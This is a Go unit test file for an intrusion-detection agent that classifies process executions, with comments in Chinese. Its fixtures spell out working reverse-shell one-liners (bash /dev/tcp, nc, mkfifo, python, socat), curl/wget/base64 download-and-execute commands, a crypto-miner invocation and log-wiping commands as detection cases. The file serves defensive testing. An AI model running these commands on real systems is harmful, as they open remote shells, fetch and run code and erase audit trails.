package agent

import "testing"

func TestEvaluateExec(t *testing.T) {
	tests := []struct {
		name string
		e    ExecInfo
		want string // 期望命中的规则，空表示不应命中
	}{
		{"bash dev tcp", ExecInfo{Comm: "bash", Cmdline: "bash -i >& /dev/tcp/10.6.6.6/4444 0>&1"}, "reverse_shell_cmd"},
		{"nc -e", ExecInfo{Comm: "nc", Cmdline: "nc 10.6.6.6 4444 -e /bin/sh"}, "reverse_shell_cmd"},
		{"mkfifo", ExecInfo{Comm: "sh", Cmdline: "sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.6.6.6 4444 >/tmp/f"}, "reverse_shell_cmd"},
		{"python pty", ExecInfo{Comm: "python3", Cmdline: `python3 -c import socket,os,pty;s=socket.socket();s.connect(("10.6.6.6",4444));os.dup2(s.fileno(),0);pty.spawn("sh")`}, "reverse_shell_cmd"},
		{"socat", ExecInfo{Comm: "socat", Cmdline: "socat tcp:10.6.6.6:4444 exec:sh,pty,stderr"}, "reverse_shell_cmd"},
		{"shell on tcp socket", ExecInfo{Comm: "sh", Exe: "/usr/bin/dash", StdioNetwork: true, StdioRemote: "10.6.6.6:4444"}, "reverse_shell"},
		{"curl pipe sh", ExecInfo{Comm: "sh", Cmdline: "sh -c curl -fsSL http://x.example/i.sh | bash"}, "download_exec"},
		{"wget chmod", ExecInfo{Comm: "sh", Cmdline: "sh -c wget http://x/a -O /tmp/.a && chmod +x /tmp/.a && /tmp/.a"}, "download_exec"},
		{"base64 sh", ExecInfo{Comm: "sh", Cmdline: "sh -c echo Y3VybCB4fHNo | base64 -d | sh"}, "download_exec"},
		{"miner", ExecInfo{Comm: "kworker", Cmdline: "./kworker -o stratum+tcp://pool.example:3333 -u x"}, "crypto_miner"},
		{"history clear", ExecInfo{Comm: "bash", Cmdline: "bash -c history -c; unset HISTFILE"}, "defense_evasion"},
		{"log wipe", ExecInfo{Comm: "sh", Cmdline: "sh -c echo > /var/log/auth.log"}, "defense_evasion"},
		{"nginx spawns sh", ExecInfo{Comm: "sh", ParentComm: "nginx"}, "web_spawn"},
		{"php-fpm runs id", ExecInfo{Comm: "id", ParentComm: "php-fpm8.3"}, "web_spawn"},
		{"java spawns bash", ExecInfo{Comm: "bash", ParentComm: "java"}, "app_spawn_shell"},

		// 正常行为不应命中
		{"ssh remote command (unix socket, not network)", ExecInfo{Comm: "bash", ParentComm: "sshd", StdioNetwork: false}, ""},
		{"normal curl download", ExecInfo{Comm: "curl", Cmdline: "curl -fsSL -o pkg.tar.gz https://example.com/pkg.tar.gz"}, ""},
		{"install script to file", ExecInfo{Comm: "sh", Cmdline: "sh install.sh"}, ""},
		{"normal history command", ExecInfo{Comm: "bash", Cmdline: "history 20"}, ""},
		{"java runs java", ExecInfo{Comm: "java", ParentComm: "java"}, ""},
		{"nginx worker", ExecInfo{Comm: "nginx", ParentComm: "nginx"}, ""},
		{"tail log", ExecInfo{Comm: "tail", Cmdline: "tail -f /var/log/auth.log"}, ""},
	}
	for _, tt := range tests {
		got := EvaluateExec(tt.e)
		if tt.want == "" {
			if len(got) != 0 {
				t.Errorf("%s: unexpected %+v", tt.name, got)
			}
			continue
		}
		found := false
		for _, f := range got {
			if f.Rule == tt.want {
				found = true
			}
		}
		if !found {
			t.Errorf("%s: want %s, got %+v", tt.name, tt.want, got)
		}
	}
}
